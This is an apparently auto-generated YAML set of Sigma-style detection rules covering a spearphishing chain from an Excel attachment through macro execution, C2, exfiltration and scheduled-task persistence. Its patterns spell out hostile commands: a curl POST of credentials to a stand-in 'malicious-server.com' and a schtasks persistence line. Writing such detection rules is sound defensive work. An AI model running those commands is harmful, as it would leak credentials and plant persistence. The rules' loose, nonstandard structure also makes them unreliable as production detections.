```yaml
- title: Identify Initial Access via Spearphishing Email
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Detects when a user opens a spearphishing email in Outlook with a specific attachment.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Name: "Outlook"
        relation: "Process Create"
      dstNode:
        Name: "Invoice.xlsx"
        Type: "File"
  condition: selection
  tags:
    - T1566.001
    - Initial Access
  level: high
---
- title: Detect Execution of Malicious Macro
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Monitors for the execution of Excel when a malicious macro is executed from an attachment.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Program Files\\Microsoft Office\\root\\OfficeXX\\EXCEL.EXE"
        relation: "Process Create"
      dstNode:
        Name: "payload.exe"
        Type: "File"
  condition: selection
  tags:
    - T1566.001
    - Execution
  level: high
---
- title: Capture Payload Execution
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Identifies the execution of the downloaded payload.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\cmd.exe"
        Cmdline: 'cmd.exe /c start "" "%TEMP%\\payload.exe"'
        relation: "Process Create"
      dstNode:
        Name: "payload.exe"
        Type: "Process"
  condition: selection
  tags:
    - T1566.001
    - Execution
  level: high
---
- title: Monitor Command and Control Communication
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Detects network connections initiated by the payload to a command and control server.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\cmd.exe"
        Cmdline: '*curl -X POST http://malicious-server.com/exfiltrate*'
        relation: "TCP Connect"
      dstNode:
        Dstaddress: "malicious-server.com"
        Port: [80, 443]
        Type: "Network"
  condition: selection
  tags:
    - T1566.001
    - Command and Control
  level: high
---
- title: Track Data Exfiltration
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Monitors HTTP requests made by the payload to exfiltrate data.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\cmd.exe"
        Cmdline: '*curl -X POST http://malicious-server.com/exfiltrate -d "username=user&password=pass"*'
        relation: "TCP Send"
      dstNode:
        Dstaddress: "malicious-server.com"
        Port: [80, 443]
        Type: "Network"
  condition: selection
  tags:
    - T1566.001
    - Exfiltration
  level: high
---
- title: Identify Cleanup and Persistence Mechanisms
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Detects the creation of scheduled tasks for persistence by the malicious payload.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\schtasks.exe"
        Cmdline: '*schtasks /create /tn "MaliciousTask" /tr "%TEMP%\\payload.exe" /sc onlogon /rl highest*'
        relation: "Process Create"
      dstNode:
        Name: "MaliciousTask"
        Type: "Process"
  condition: selection
  tags:
    - T1566.001
    - Persistence
  level: high
```